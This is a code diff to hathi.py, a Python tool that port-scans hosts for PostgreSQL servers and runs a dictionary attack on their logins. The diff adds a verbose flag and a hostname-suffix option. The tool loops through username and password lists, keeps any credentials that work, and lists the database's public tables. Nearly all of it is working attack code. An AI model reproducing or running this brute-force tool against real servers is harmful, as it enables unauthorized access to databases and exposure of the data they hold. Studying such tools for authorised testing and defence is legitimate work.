@@ -1,5 +1,9 @@
 """
-usage: hathi.py [-h] [--usernames USERNAMES] [--passwords PASSWORDS] [--results RESULTS] host [host ...]
+Requirements:
+ > pip install -r requirements.txt
+
+
+Usage: hathi.py [-h] [--usernames USERNAMES] [--passwords PASSWORDS] [--results RESULTS] [--hostname HOSTNAME] [--verbose] host [host ...]
 
 Port scan and dictionary attack postgresql servers.
 
@@ -13,6 +17,8 @@ optional arguments:
   --passwords PASSWORDS
                         password list
   --results RESULTS     path to a results file
+  --hostname HOSTNAME   an @hostname to append to the usernames
+  --verbose
 """
 
 import argparse
@@ -23,10 +29,9 @@ from typing import List, Optional
 from collections import namedtuple
 
 timeout = 1.0
-SSL_MODE = "require"  # Try SSL first and fallback to non-SSL if failed
+SSL_MODE = "require"  # require = required, Try SSL first and fallback to non-SSL if failed
 POSTGRES_PORT = 5432
 DATABASE_NAME = "postgres"
-DEBUG=True
 
 Match = namedtuple("Match", "username password host database data")
 
@@ -41,10 +46,10 @@ async def try_hosts(hosts: List[str], port: int = POSTGRES_PORT):
             found += 1
             w.close()
         except (asyncio.TimeoutError, OSError):
-            pass  # closed
+            print(f"Could not connect to {host}")
 
 
-async def try_connection(host: str, database: str, usernames: str, passwords: str, hostname: Optional[str] = None):
+async def try_connection(host: str, database: str, usernames: str, passwords: str, hostname: Optional[str] = None, verbose = False):
     with open(usernames, "r") as username_list:
         for username in username_list:
             username = username.strip()
@@ -63,29 +68,29 @@ async def try_connection(host: str, database: str, usernames: str, passwords: st
                             timeout=timeout,
                         )
                         data = await conn.fetch("select table_name from information_schema.tables where table_schema='public';")
-                        if DEBUG:
+                        if verbose:
                             print(f"Matched {username}:{password} on {host}")
                         yield Match(username, password, host, database, data)
                         await conn.close()
                         break
                     except asyncpg.exceptions.InvalidPasswordError as pe:
-                        if DEBUG:
+                        if verbose:
                             print(f"Invalid password {password} : ({pe})")
                     except asyncpg.exceptions.InvalidAuthorizationSpecificationError as pe:
-                        if DEBUG:
+                        if verbose:
                             print(f"Invalid username {username} : ({pe})")
                         break
                     except asyncpg.exceptions._base.PostgresError as pe:
-                        if DEBUG:
+                        if verbose:
                             print(f"Failed {username}:{password} on {host} {pe} {type(pe)}")
                         pass
                     except asyncio.TimeoutError:
-                        if DEBUG:
+                        if verbose:
                             print(f"Timeout {username}:{password} on {host}")
                         pass  # closed
 
 
-async def scan(hosts: List[str], usernames: str, passwords: str, hostname: Optional[str] = None):
+async def scan(hosts: List[str], usernames: str, passwords: str, hostname: Optional[str] = None, verbose = False):
     open_hosts = []
     async for open_host in try_hosts(hosts):
         open_hosts.append(open_host)
@@ -95,7 +100,7 @@ async def scan(hosts: List[str], usernames: str, passwords: str, hostname: Optio
 
     for host in open_hosts:
         async for match in try_connection(
-            host, DATABASE_NAME, usernames, passwords, hostname
+            host, DATABASE_NAME, usernames, passwords, hostname, verbose
         ):
             matched_connections.append(match)
     return matched_connections
@@ -120,11 +125,13 @@ if __name__ == "__main__":
     parser.add_argument(
         "--hostname", type=str, help="an @hostname to append to the usernames"
     )
+    parser.add_argument(
+        "--verbose", action="store_true"
+    )
     args = parser.parse_args()
     start = time.time()
-    if DEBUG:
-        print(args)
-    results = asyncio.run(scan(args.hosts, args.usernames, args.passwords, args.hostname))
+
+    results = asyncio.run(scan(args.hosts, args.usernames, args.passwords, args.hostname, args.verbose))
 
     if args.results:
         with open(args.results) as results_f:
